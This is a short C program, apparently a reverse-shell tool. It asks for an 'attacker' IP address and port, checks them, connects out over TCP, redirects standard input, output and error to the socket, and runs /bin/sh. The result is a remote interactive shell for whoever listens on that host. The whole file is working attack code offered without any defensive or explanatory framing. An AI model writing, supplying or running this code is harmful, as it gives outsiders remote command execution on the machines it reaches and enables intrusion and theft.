#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_IP_LENGTH 16

int validateIPAddress(const char *ip) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
    return result != 0;
}

int validatePortNumber(int port) {
    return port > 0 && port <= 65535;
}

int main(void) {
    char remoteIP[MAX_IP_LENGTH];
    int attackerPort;

    printf("Enter the remote IP address: ");
    fgets(remoteIP, MAX_IP_LENGTH, stdin);

    // Remove the trailing newline character
    remoteIP[strcspn(remoteIP, "\n")] = '\0';

    while (!validateIPAddress(remoteIP)) {
        printf("Invalid IP address. Enter the remote IP address: ");
        fgets(remoteIP, MAX_IP_LENGTH, stdin);

        // Remove the trailing newline character
        remoteIP[strcspn(remoteIP, "\n")] = '\0';
    }

    printf("Enter the attacker port number: ");
    scanf("%d", &attackerPort);

    while (!validatePortNumber(attackerPort)) {
        printf("Invalid port number. Enter the attacker port number: ");
        scanf("%d", &attackerPort);
    }

    // Clear the input buffer
    while (getchar() != '\n')
        ;

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(attackerPort);
    sa.sin_addr.s_addr = inet_addr(remoteIP);

    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        printf("[ERROR] Connection failed.\n");
        return 1;
    }

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char *const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
